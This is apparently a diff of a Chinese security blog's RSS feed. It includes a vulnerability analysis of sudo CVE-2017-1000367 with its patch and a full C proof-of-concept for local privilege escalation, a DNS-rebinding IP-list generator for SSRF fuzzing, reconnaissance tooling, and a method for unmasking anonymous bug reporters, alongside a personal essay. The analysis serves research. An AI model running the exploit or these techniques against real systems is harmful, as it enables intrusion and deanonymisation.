+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/0day.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      这个怎么玩取决于你的小脑袋瓜的脑回路了。如果防火墙还要验证是否为信任地址的话修改lib/common.py：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;elif payload != 'None' and payload.find(mainDomain) == -1:
+    record = payload + &quot;信任地址.&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;ipListBuild:
+批量生成网段地址，选择性编码，适合ssrf内网地址fuzz。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;python lib/common.py 192.168.1.1
+
+1. Single IP Covert For En
+2. Build IP List
+[+] [1 By Default/2]2
+[+] Please Input Segment Length [24 By Default]
+[+] Please Input Encoding ['ipv4' By Default]hex
+[+] Please Input Server Root Address [test.example.com By Default]
+[+] Stored in the 20170625223912_test_example_com_hex.txt
+[root@VM_34_252_centos dnsAutoRebinding]# head -n 5 20170625223912_test_example_com_hex.txt
+3139322e3136382e312e31.test.example.com
+3139322e3136382e312e32.test.example.com
+3139322e3136382e312e33.test.example.com
+3139322e3136382e312e34.test.example.com
+3139322e3136382e312e35.test.example.com
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
 <pubDate>Sun, 25 Jun 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/06/25/dns-auto-rebinding.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/06/25/dns-auto-rebinding.html</guid>
@@ -43,6 +584,196 @@
 
 <item>
 <title>sudo本地提权 CVE-2017-1000367 漏洞分析</title>
+<description>&lt;h1 id=&quot;sudo本地提权-cve-2017-1000367-漏洞分析&quot;&gt;sudo本地提权 CVE-2017-1000367 漏洞分析&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;12 Jun 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;p&gt;      该漏洞发生在/src/ttyname.c的&lt;code&gt;get_process_ttyname()&lt;/code&gt;函数，sudo在获取tty设备号时没有正确解析/proc/[pid]/stat的内容。首先，/proc/[pid]的stat包含了所有的CPU活跃信息，有关触发此漏洞的两个stat参数分别为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;第2个：comm应用程序或命令的名字
+第7个：tty_nr也就是tty设备号
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这些参数是使用空格进行分割的，再来看看get_process_ttyname()函数是怎么获取&lt;code&gt;tty_nr&lt;/code&gt;的：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;len = getline(&amp;amp;line, &amp;amp;linesize, fp);
+fclose(fp);
+if (len != -1) {
+    / Field 7 is the tty dev (0 if no tty) /
+    char cp = line;
+    char ep = line;
+    const char errstr;
+    int field = 0;
+    while (++ep != '\0') {
+        if (ep == ' ') {
+            ep = '\0';
+            if (++field == 7) {
+                dev_t tdev = strtonum(cp, INT_MIN, INT_MAX, &amp;amp;errstr);
+                if (errstr) {
+                    sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
+                        &quot;%s: tty device %s: %s&quot;, path, cp, errstr);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      程序在获取tty_nr时也就是根据多少空格个来判断当前是哪个参数，那么上面提到的第2个参数comm，这个参数是以括号独立起来的，并且程序或命令的名字当然允许包含空格。那么就可以通过控制comm参数的空格导致tty_nr的值同样被控制，使得本地攻击者来覆盖文件系统上的任何文件，从而绕过预期权限或获取root shell。&lt;/p&gt;
+
+&lt;p&gt;      再来看看补丁，补丁第一处是将get_process_ttyname()函数在获取tty_nr时从’)’后开始获取，这样避免了comm包含空格的特性：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if (nread == 0 &amp;amp;&amp;amp; memchr(buf, '\0', cp - buf) == NULL) {
+    /
+      Field 7 is the tty dev (0 if no tty).
+      Since the process name at field 2 &quot;(comm)&quot; may include
+      whitespace (including newlines), start at the last ')' found.
+     /
+    cp = '\0';
+    cp = strrchr(buf, ')');
+    if (cp != NULL) {
+    char ep = cp;
+    const char errstr;
+    int field = 1;
+
+    while (++ep != '\0') {
+        if (ep == ' ') {
+        ep = '\0';
+        if (++field == 7) {
+            dev_t tdev = strtonum(cp, INT_MIN, INT_MAX, &amp;amp;errstr);
+            if (errstr) {
+            sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
+                &quot;%s: tty device %s: %s&quot;, path, cp, errstr);
+            }
+            if (tdev &amp;gt; 0) {
+            errno = serrno;
+            ret = sudo_ttyname_dev(tdev, name, namelen);
+            goto done;
+            }
+            break;
+        }
+        cp = ep + 1;
+        }
+    }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;第二处是添加了搜索设备号对应的设备名的两个地址：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; static char ignore_devs[] = {
+     &quot;/dev/fd/&quot;,
++    &quot;/dev/mqueue/&quot;,
++    &quot;/dev/shm/&quot;,
+     &quot;/dev/stdin&quot;,
+     &quot;/dev/stdout&quot;,
+     &quot;/dev/stderr&quot;,
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;POC:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#define _GNU_SOURCE
+#include &amp;lt;errno.h&amp;gt;
+#include &amp;lt;linux/sched.h&amp;gt;
+#include &amp;lt;pty.h&amp;gt;
+#include &amp;lt;sched.h&amp;gt;
+#include &amp;lt;signal.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/inotify.h&amp;gt;
+#include &amp;lt;sys/resource.h&amp;gt;
+#include &amp;lt;sys/stat.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/wait.h&amp;gt;
+
+#define EVENT_SIZE  ( sizeof (struct inotify_event) )
+#define EVENT_BUF_LEN     ( 1024  ( EVENT_SIZE + 16 ) )
+
+
+int main( )
+{
+
+    int length, i = 0;
+  int fd;
+  int wd;
+  char buffer[EVENT_BUF_LEN];
+
+    int master, slave;
+    char pts_path[256];
+
+    cpu_set_t  mask;
+    struct sched_param params;
+    params.sched_priority = 0;
+    CPU_ZERO(&amp;amp;mask);
+    CPU_SET(0, &amp;amp;mask);
+
+    mkdir(&quot;/dev/shm/_tmp&quot;, 0755);
+    symlink(&quot;/dev/pts/57&quot;, &quot;/dev/shm/_tmp/_tty&quot;);
+    symlink(&quot;/usr/bin/sudo&quot;, &quot;/dev/shm/_tmp/     34873 &quot;);
+
+    fd = inotify_init();
+    wd = inotify_add_watch( fd, &quot;/dev/shm/_tmp&quot;, IN_OPEN | IN_CLOSE_NOWRITE );
+
+     pid_t pid = fork();
+
+    if(pid == 0) {
+        sched_setaffinity(pid, sizeof(mask), &amp;amp;mask);
+        sched_setscheduler(pid, SCHED_IDLE, &amp;amp;params);
+        setpriority(PRIO_PROCESS, pid, 19);
+
+        sleep(1);
+        execlp(&quot;/dev/shm/_tmp/     34873 &quot;, &quot;sudo&quot;, &quot;-r&quot;, &quot;unconfined_r&quot;, &quot;/usr/bin/sum&quot;, &quot;—\nHELLO\nWORLD\n&quot;, NULL);
+    }else{
+        setpriority(PRIO_PROCESS, 0, -20);
+        int state = 0;
+        while(1) {
+            length = read( fd, buffer, EVENT_BUF_LEN );
+            kill(pid, SIGSTOP);
+
+            i=0;
+            while ( i &amp;lt; length ) {
+                struct inotify_event event = ( struct inotify_event * ) &amp;amp;buffer[ i ];
+
+                if ( event-&amp;gt;mask &amp;amp; IN_OPEN ) {
+                    //kill(pid, SIGSTOP);
+
+                    while(strcmp(pts_path,&quot;/dev/pts/57&quot;)){
+                        openpty(&amp;amp;master, &amp;amp;slave, &amp;amp;pts_path[0], NULL, NULL);
+                    };
+                    //kill(pid, SIGCONT);
+                    break;
+
+                }else if ( event-&amp;gt;mask &amp;amp; IN_CLOSE_NOWRITE ) {
+                    //kill(pid, SIGSTOP);
+
+                    unlink(&quot;/dev/shm/_tmp/_tty&quot;);
+                    symlink(&quot;/etc/motd&quot;, &quot;/dev/shm/_tmp/_tty&quot;);
+                    //kill(pid, SIGCONT);
+
+                    state = 1;
+                    break;
+                }
+
+                i += EVENT_SIZE + event-&amp;gt;len;
+
+            }
+            kill(pid, SIGCONT);
+            if(state == 1) break;
+        }
+
+        waitpid(pid, NULL, 0);
+        inotify_rm_watch( fd, wd );
+        close( fd );
+        close(wd);
+
+        unlink(&quot;/dev/shm/_tmp/_tty&quot;);
+        unlink(&quot;/dev/shm/_tmp/     34873 &quot;);
+        rmdir(&quot;/dev/shm/_tmp&quot;);
+        close(master);
+        close(slave);
+    }
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/4refdergth.png&quot; /&gt;&lt;/p&gt;
+
+</description>
 <pubDate>Mon, 12 Jun 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/06/12/cve-2017-1000367.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/06/12/cve-2017-1000367.html</guid>
@@ -50,6 +781,92 @@
 
 <item>
 <title>乌合之众</title>
+<description>&lt;h1 id=&quot;乌合之众&quot;&gt;乌合之众&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;07 Jun 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;      有位老朋友说你几年前不是不玩微信的吗？是啊，几年前我感觉这个东西是约炮用的，哈哈就当我当时是在装纯吧。要说“玩”的话，我想它也没有给我带来什么乐趣。这篇文章叫乌合之众和有本书《乌合之众》有着异曲同工之妙，只是没那老头儿研究的那么专业罢了。没想表达什么，在看的你就当图个乐子吧。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h5 id=&quot;朋友圈和微博&quot;&gt;朋友圈和微博&lt;/h5&gt;
+
+&lt;p&gt;      不知何时起网友也能成为一个关系不一般的群体，而且还能凭借互相吹捧走上人生巅峰。这是怎么造成的，其他圈子我不了解。但从技术圈来看，大致是这样的：很多人都想被宠爱；想证明自己最屌。希望别人捧臭脚嘛，我也经常给好哥们捧臭脚，这没什么大不了但只限于好哥们。&lt;/p&gt;
+
+&lt;p&gt;      至于转发刷屏这种事好像两年没干过了，就是说一个链接被很多网友转发朋友圈。以前发过的我都删了，现在别人刷的我也不会刷了。不是我不关注技术，而是换种更合适的方式：给几个真正研究技术聊得来的人或群发一发，一起真正探讨下，而不是非得刷屏才证明自己跟得上潮流。我也希望我发的东西别人会看到，但我不是一个爱面子的人，夸我人时我从来不在意，若是夸我做的事情我会很感谢与欣慰，所以你连看都没看单纯友情转发那没什么必要了。刷来刷去还是那些人看到，这种行为有时候也挺讨人嫌的。有种潜规则就是你帮我转发我们就是friend~&lt;/p&gt;
+
+&lt;p&gt;      微博啥用没有的认证被我取消后就不怎么玩了，也忘记了什么阶段玩的最欢；涨的粉丝最多了。现在也就单纯找找乐子，有些人我还不舍得取关，每天转发好几篇连自己都看不懂技术细节的文章，转发title也就抄袭下文章标题，不过看看标题也挺好2333。我个人更倾向于对文章有不同的观点或见解。这俩东西也能看出谁是真关心技术；谁只是给外行做做样子；还有谁最飘。&lt;/p&gt;
+
+&lt;p&gt;      关于帽子颜色的问题，白帽子这个观点已经被扭曲了，对外pr时也是xx白帽子上报漏洞获得多少多少奖励，这就已经越过了所谓白帽子的界线了。我想只有主动将所获得的奖励捐掉的人更应该被人信服为白帽子吧。我是没有那么慷慨激昂所以也从来不会说我是什么颜色的帽子，我只拿我应得的，对我来说这就够了。&lt;/p&gt;
+
+&lt;h5 id=&quot;传说中的singlego&quot;&gt;传说中的SingleGo&lt;/h5&gt;
+
+&lt;p&gt;      逢年过节秀恩爱和吐槽秀恩爱的人数是成正比的，细思极恐，其实这种SingleGo的本意是在暗示别人我现在单身呢，谁快点来勾搭我啊！&lt;/p&gt;
+
+&lt;p&gt;      就算我Single与否，也并不觉得秀恩爱有多么万恶，甚至觉得是生活中的一种美好。这和开着Tango T600炫富是两码事。&lt;/p&gt;
+
+&lt;h5 id=&quot;打游戏&quot;&gt;打游戏&lt;/h5&gt;
+
+&lt;p&gt;      跟风玩了一阵王者荣耀，这个游戏是我moba类型游戏中玩的最卖力的。打游戏时我也跟风撕逼，当结束这盘游戏回归到现实生活中想想其实无关痛痒的，认真你就输了，可悲的是有的人回不到现实生活中。&lt;/p&gt;
+
+&lt;p&gt;      有没有想过在随机匹配队友的情况下怎么才能互相信任与默契，有一部分原因会是运气？曾有位女网友对我讲这个游戏结束后常给队友点赞的话匹配到靠谱队友的几率更高。虽然不知道真假，但这tmd运气都要介入算法也是666。这还不包括真正存在特殊情况，有次我肚子疼连送三个吧好像，就把情况告诉了队友，我想当时不是顺风的话他们就骂我了。&lt;/p&gt;
+
+&lt;p&gt;      我很佩服一种人，在游戏中只是找个开心罢了，而不是非得升到什么段位才肯罢休。我就是这种人hahaha，不过我也会给自己个小门槛才行，不然段位太低和队友玩起来也不顺心。&lt;/p&gt;
+
+&lt;h5 id=&quot;看电影&quot;&gt;看电影&lt;/h5&gt;
+
+&lt;p&gt;      每年看的电影不少，每次出行的路上也少不了看电影。豆瓣倒是让我养成了个习惯，每看完一个电影就在上面没有影评只有星的记录下，甚至以前看过的想起来也记录一下，而且都在3-5星。不知为什么我还真没有给电影差评的习惯，可能每个都能学到点东西吧。说到从电影中学东西，不知道你们看没看过《误杀瞒天记》。&lt;/p&gt;
+
+&lt;p&gt;      电影是属于文化的，既然称得上文化那么每部都有它存在的价值。什么类型的电影我都看过，不知道你们看没看过当年的《四平青年》，这个电影要说品味的话我感觉没什么品味而且满屏的骂人和黄段子。但有一点要注意，虽然这电影被称为最low，却有个不错的观看数量，甚至爱奇艺都与之合作。可以说这几位跳二人转出身的演员演技并不差，毕竟理想就是演员，即使拍这种低俗片只要夺得观众眼球就是种能力。我就很服气充高尚的人，说不准偷偷看完删除观看记录呢～还是那句话因人而异。&lt;/p&gt;
+
+&lt;p&gt;      速度与激情8上映时我购了两次票，第一次是首映预售结果忘记去了。第二次勉强选了个第二排的位置，承受着大脖筋的酸痛看了两个多小时。杰森斯坦森救小孩时全场叫啊叫，从声音来讲多数都是女性的声音。唉我发现女人特别的神奇啊，有时候也挺有意思的，我也不知道怎么讲，算了那就不讲了。&lt;/p&gt;
+
+&lt;h5 id=&quot;地域歧视&quot;&gt;地域歧视&lt;/h5&gt;
+
+&lt;p&gt;      想到哪写到哪，至于地域歧视～我一直没理解广东人吃福建人到底是个什么梗，好吧这不是地域歧视的典故哈哈。&lt;/p&gt;
+
+&lt;h5 id=&quot;对免费的事物所抱怨&quot;&gt;对免费的事物所抱怨&lt;/h5&gt;
+
+&lt;p&gt;      不知道你有没有对免费事物所抱怨的时候，谩骂xx APP新版本用户体验、开始投放广告之类的。这些人的心理就是认为你必须让我满意才对。大哥，您纳税又没纳到人家那里。或者白给你玩的游戏也要被骂。真是世道不同了，换做20年前花钱求都求不到当今这些免费的便利。&lt;/p&gt;
+
+&lt;h5 id=&quot;一位网友&quot;&gt;一位网友&lt;/h5&gt;
+
+&lt;p&gt;      前几天一网友找我问了个技术问题，当时我的内心没有任何波澜，甚至点了根烟然后帮他解答了。殊不知这位网友是我六七年前感觉技术可以的网友。清楚记得当时同样场景；不一样的结果。估计他也不记得当时的我了。毕竟谁不喜欢和优秀的人来往；和低于自己的人疏远呢。人是不会换位思考的，就算会；换作是我可能也会这样吧。&lt;/p&gt;
+
+&lt;p&gt;      这个故事没想刻意表达什么，有句话是什么“叫你高攀不起”什么的，我想说这话的人就凭这自慰心理还在卖烧饼吧。&lt;/p&gt;
+
+&lt;h5 id=&quot;一位朋友&quot;&gt;一位朋友&lt;/h5&gt;
+
+&lt;p&gt;      去年接触了个入门级但印象很深的选手，之所以说我对他印象深，因为他在别人眼中是个很奇怪的人。说话支支吾吾，和他交流起来是很困难的。但我知道他的语言是不符合真正想法的。只要拼智商的实践他都会更胜一筹。这样的短板也导致了他在很多地方没法施展出自己的才智。&lt;/p&gt;
+
+&lt;p&gt;      我对这个人很感兴趣，甚至感觉我俩有所共同之处。也曾抛过橄榄枝，因为他就是我想要的，不是那种虚伪爱装王八犊子而是真正喜欢技术的人。入门晚很正常，技术可贵的不是谁最厉害，而是谁肯为这个行业创造的价值最大，甚至是给后人。毕竟谁都有死亡的那一天。&lt;/p&gt;
+
+&lt;h5 id=&quot;富二代官二代&quot;&gt;富二代官二代&lt;/h5&gt;
+
+&lt;p&gt;      有次不知在干嘛时想到一个问题：从普遍现象来看，官富二代哪个更有涵养？未经统计只是我客观觉得从受教育程度来讲，可能官二代更有涵养一些。地主家的傻儿子会更傲一些吧。这里不存在偏见，除非哪个富二代承认自己是地主家的傻儿子。&lt;/p&gt;
+
+&lt;p&gt;      为什么这么说呢，在我接触过的官富二代都算是娇生惯养出身，但我发现两者有个不同之处，官二代显然会比富二代更懂得尊重社会底层人群，而不是为了发朋友圈。&lt;/p&gt;
+
+&lt;h5 id=&quot;受教育程度&quot;&gt;受教育程度&lt;/h5&gt;
+
+&lt;p&gt;      刚才提到了受教育程度；在我很早以前求学阶段的受教育程度并不高，从小就不怎么喜欢学习，但我父母还挺靠谱的，童年没怎么玩过全是做功课，但还是没改变什么。感觉像是从出生的那一刻就注定被社会所强迫要去做什么事情。后来发现不是我不喜欢学习，而是不喜欢被别人规定你该学什么。我知道多数教师是好意的，但我活一回是为自己活的也知道怎么活才最适合我。&lt;/p&gt;
+
+&lt;p&gt;      所以学历重要吗？我从身边很多学霸出身的人中学到了一个真理：当学历还有提升的余地时，一定要抓住；不差那么一哆嗦了。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;高学历的人对你说学历没用：他是装b
+低学历的人对你说学历没用：他是傻b
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;      除非有真正比学历有用的能力才配得上说学历没用，我这里说的能力是指真枪实弹，而不是靠被pr吹嘘出来的。&lt;/p&gt;
+
+&lt;h5 id=&quot;屯书与看书&quot;&gt;屯书与看书&lt;/h5&gt;
+
+&lt;p&gt;      我这个人很喜欢屯书，甚至单单技术书摞起来快赶上我人高了，但不代表我全都看过。我也有很多事要做（不是写这种文章的事），用到时去翻阅记忆会深刻些，有时我在想这些书里的知识都可以查询得到为什么还要花钱买，而且有几本特别厚的书我基本都没看过。就当充值信仰吧，对饭碗连最基本的给知识投资都没有那太吝啬了。&lt;/p&gt;
+
+&lt;h5 id=&quot;写完了&quot;&gt;写完了&lt;/h5&gt;
+
+&lt;p&gt;      “睡前写的，爱看不看”，这几个字好像得放在开篇，算了就这么地吧。&lt;/p&gt;
+
+</description>
 <pubDate>Wed, 07 Jun 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/06/07/motley-crowd.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/06/07/motley-crowd.html</guid>
@@ -57,6 +874,18 @@
 
 <item>
 <title>Web App 特征识别库</title>
+<description>&lt;h1 id=&quot;web-app-特征识别库&quot;&gt;Web App 特征识别库&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;29 May 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;之前一直抓fofa的规则进行使用，新版本后规则都被隐藏了。就把较近版本的规则发出来，2119条mysql格式的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/tdfcx.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://gist.github.com/Tr3jer/271a9e26e267a47a8e9f1aa76c47a003&quot;&gt;Github Gist&lt;/a&gt;&lt;/p&gt;
+
+</description>
 <pubDate>Mon, 29 May 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/05/29/characteristics-data.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/05/29/characteristics-data.html</guid>
@@ -64,6 +893,47 @@
 
 <item>
 <title>Auto Hooks Spider</title>
+<description>&lt;h1 id=&quot;auto-hooks-spider&quot;&gt;Auto Hooks Spider&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;24 May 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;好像好久没发东西了，抽空研究自动化，一部分是如何有效获取自动化的food，想了很多也实现出了很多，比如一些常规手法、PassiveDNS等等，尤其后者虽然有效果但发现有个弊端，就是说从这种底层记录进行筛选贼TMD烧硬件。不然我就想去拆小区交换机了= =。倒不如实现个自动spider，省了来回点啊点。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;      实现很简单，因为我本地实现的比较复杂，所以是把它拆分下改成现成的发出来。还有就是代理的实现我没放进去，想爬墙外的话可以改下requests模块，拆分url判断是否存在于gfw列表就行了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/4rfedsxz.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      个人收集的有价值主域名1000+，hooks.txt先放200个你们玩。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/4trefds.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Tr3jer/AutoHookSpider&quot;&gt;https://github.com/Tr3jer/AutoHookSpider&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code&gt;AutoHookSpider
+├── LICENSE
+├── README.md
+├── hooks.txt   #hooks字典，随机放了200个，可以自己收集。
+├── lib
+│   ├── __init__.py
+│   ├── common.py   #琐碎功能
+│   └── record.sql  #先在Mysql创建这个表
+├── main.py #主程序
+└── requirements.txt
+
+sudo pip install -r requirements.txt
+lib/record.sql into mysql
+usage: python main.py {Options}[ google.com,twitter.com,facebook.com | -t 20 ]
+或者直接python main.py会直接在hooks.txt抽取(thread_cnt)个入口域名。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;比如你想专门抓一个公司的子域名，那么将hooks放入该inc的主域名直接运行就ok。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+</description>
 <pubDate>Wed, 24 May 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/05/24/auto-hooks-spider.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/05/24/auto-hooks-spider.html</guid>
@@ -71,6 +941,18 @@
 
 <item>
 <title>Aliyun Xianzhi Speech PPT</title>
+<description>&lt;h1 id=&quot;aliyun-xianzhi-speech-ppt&quot;&gt;Aliyun Xianzhi Speech PPT&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;30 Mar 2017 - Tr3jer_CongRong&lt;/p&gt;
+&lt;center&gt;
+&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/314bnrkc.png&quot; /&gt;
+&lt;/center&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;之前在阿里云先知大会的speech，PPT在这里：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/%E6%B2%A1%E6%9C%89%E7%BB%9D%E5%AF%B9%E7%9A%84waf%E9%98%B2%E5%BE%A1.pptx&quot;&gt;没有绝对的WAF防御.pptx&lt;/a&gt;&lt;/p&gt;
+</description>
 <pubDate>Thu, 30 Mar 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/03/30/xianzhi-ppt.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/03/30/xianzhi-ppt.html</guid>
@@ -78,6 +960,31 @@
 
 <item>
 <title>My Waf Bypass Series Article</title>
+<description>&lt;h1 id=&quot;my-waf-bypass-series-article&quot;&gt;My Waf Bypass Series Article&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;13 Feb 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;之前在阿里云先知社区连载的三篇wafbypass文章，pdf在这里：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/wafbypass_sql.pdf&quot;&gt;wafbypass_sql.pdf&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/wafbypass_upload.pdf&quot;&gt;wafbypass_upload.pdf&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/wafbypass_misc.pdf&quot;&gt;wafbypass_misc.pdf&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Timeline：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;20170213 add wafbypass_misc&lt;/li&gt;
+  &lt;li&gt;20170213 update wafbypass_upload&lt;/li&gt;
+  &lt;li&gt;20170213 update wafbypass_sql&lt;/li&gt;
+  &lt;li&gt;20161129 add wafbypass_upload&lt;/li&gt;
+  &lt;li&gt;20161117 add wafbypass_sql&lt;/li&gt;
+&lt;/ul&gt;
+</description>
 <pubDate>Mon, 13 Feb 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/02/13/my-waf-bypass-series-article.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/02/13/my-waf-bypass-series-article.html</guid>
@@ -85,6 +992,63 @@
 
 <item>
 <title>Big Company Extensive Ip List</title>
+<description>&lt;h1 id=&quot;big-company-extensive-ip-list&quot;&gt;Big Company Extensive Ip List&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;12 Feb 2017 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;从扫描器结果分离出的一些大公司泛解析ip列表，还没更新完。目前在扫描范围的inc：&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code&gt;360
+adobe
+alibaba
+amazon
+antgroup
+apple
+autohome
+baidu
+blockchain
+didi
+dropbox
+ebay
+facebook
+github
+google
+hackerone
+jd
+kuaishou
+linkedin
+localtapiola
+microsoft
+momo
+netease
+paypal
+pingan
+pornhub
+rockstargames
+shopify
+sina
+slack
+smartisan
+snapchat
+starbucks
+tencent
+toutiao
+twitter
+uber
+vimeo
+vip
+vk
+xiaomi
+yahoo
+youporn
+other ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;https://github.com/Tr3jer/IncExtensiveList&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
 <pubDate>Sun, 12 Feb 2017 00:00:00 +0800</pubDate>
 <link>http://localhost:4000/2017/02/12/inc-extensive-ip-list.html</link>
 <guid isPermaLink="true">http://localhost:4000/2017/02/12/inc-extensive-ip-list.html</guid>
@@ -92,6 +1056,74 @@
 
 <item>
 <title>未完成的事 - 逆推乌云路人甲真实ID</title>
+<description>&lt;h1 id=&quot;未完成的事---逆推乌云路人甲真实id&quot;&gt;未完成的事 - 逆推乌云路人甲真实ID&lt;/h1&gt;
+&lt;p class=&quot;date&quot;&gt;25 Dec 2016 - Tr3jer_CongRong&lt;/p&gt;
+
+&lt;p&gt;      翻笔记看到了之前实现破解乌云路人甲真实ID的笔记，由于某原因在实现过程中不能继续开展了，不然也不会发出来23333，貌似没什么卵用了就把实现过程与想法发出来纪念下。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;实现过程不依赖任何存在的漏洞，纯是细节捕捉-&amp;gt;逻辑推理-&amp;gt;算法实现，当时初步测试成功率为70%左右。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;      2014年末多出了个人中心页面。这个功能的出现，产生了“个人主页”-&amp;gt;“荣誉”-&amp;gt;“提交多少漏洞”与“白帽子贡献榜”-&amp;gt;“提交漏洞数”-&amp;gt;的数值不一致，后者比前者多出的个数也就是匿名提交的。&lt;/p&gt;
+
+&lt;p&gt;Old：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/5erdfc.png&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;因为存在浮动问题，可以设两个时间点，爬取两个时间点的整站数据。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;白帽子人气榜-&amp;gt;漏洞关注数(a)-非匿名漏洞关注数(b)=个人所有匿名漏洞的关注数(n)。&lt;/li&gt;
+  &lt;li&gt;个人匿名漏洞数(x)和xrange(range(0,x),n+1)的所有组合(y)。&lt;/li&gt;
+  &lt;li&gt;然后根据所有路人甲漏洞的关注数(z)进行匹配y，实现筛选出漏洞关注数min-max的匿名漏洞范围。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://blog-1252048719.cos.ap-shanghai.myqcloud.com/5202.png&quot; /&gt;&lt;/p&gt;
+
